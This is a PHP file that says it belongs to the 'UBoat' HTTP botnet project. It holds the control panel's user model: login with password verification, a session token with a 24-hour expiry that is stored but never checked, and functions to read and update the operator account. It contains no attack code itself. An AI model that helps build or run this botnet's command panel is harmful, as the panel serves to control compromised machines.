<?php

/**
 * This file is part of UBoat - HTTP Botnet Project
 */

class user extends Model
{
    public function actionAuth($data)
    {
        $result = $this->query('SELECT * FROM `user` WHERE `username` = :u', ['binded' => [':u' => $data['username']], 'fetch' => 'true']);

        if (! empty($result) && password_verify($data['password'], $result['password'])) {
            //redirect to fucking panel
            return $this->csrf($result['id']);
        }

        return false;
    }

    public function getUser()
    {
        $token = $_SESSION['csrf'];
        if (empty($token)) {
            return false;
        } // should never happen.
        return $this->query('SELECT `username` FROM `user` WHERE `auth_token` = :t', ['binded' => [':t' => bin2hex($token)], 'fetch' => 'true']);
    }

    public function updateUser($data)
    {
        $token = $_SESSION['csrf'];
        if (empty($token)) {
            return false;
        } // should never happen.

        $this->query('UPDATE `user` SET `username` = :u, `password` = :p WHERE `auth_token` = :t', ['binded' => [':u' => $data['user'], ':p' => password_hash($data['pass'], PASSWORD_DEFAULT), ':t' => bin2hex($token)]]);

        return true;
    }

    private function csrf($id)
    {
        $expiration = time() + 86400; //24 hours
        $token = mcrypt_create_iv(16, MCRYPT_DEV_URANDOM).'_'.$expiration;
        $_SESSION['csrf'] = $token;

        $this->query('UPDATE `user` SET `auth_token` = :t WHERE id = :id', ['binded' => [':t' => bin2hex($_SESSION['csrf']), ':id' => $id]]);

        return true;
    }
}
